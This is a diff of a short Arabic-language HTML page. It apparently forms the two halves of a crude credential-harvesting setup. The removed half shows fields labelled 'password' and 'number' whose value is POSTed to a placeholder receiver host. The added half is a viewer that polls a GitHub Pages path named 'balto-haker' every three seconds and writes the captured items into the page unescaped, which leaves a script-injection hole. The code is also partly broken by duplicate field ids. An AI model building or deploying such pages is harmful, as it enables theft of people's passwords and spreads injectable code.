@@ -3,22 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال رسالة</title>
+    <title>استقبال الرسائل</title>
 </head>
 <body>
-    <input type="text" id="message" placeholder="كلمة سر">
-    <input type="text" id="message" placeholder="رقم">
-    <button onclick="sendMessage()">إرسال</button>
+    <h2>الرسائل المستلمة:</h2>
+    <ul id="messages"></ul>
 
     <script>
-        function sendMessage() {
-            const message = document.getElementById("message").value;
-            fetch("https://your-receiver-site.com/api/messages", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ message })
-            }).then(res => alert("تم الإرسال!"));
+        function fetchMessages() {
+            fetch("https://kero098.github.io/balto-haker/")
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("messages").innerHTML = data.map(msg => `<li>${msg}</li>`).join("");
+                });
         }
+        setInterval(fetchMessages, 3000); // تحديث كل 3 ثوانٍ
     </script>
 </body>
 </html>
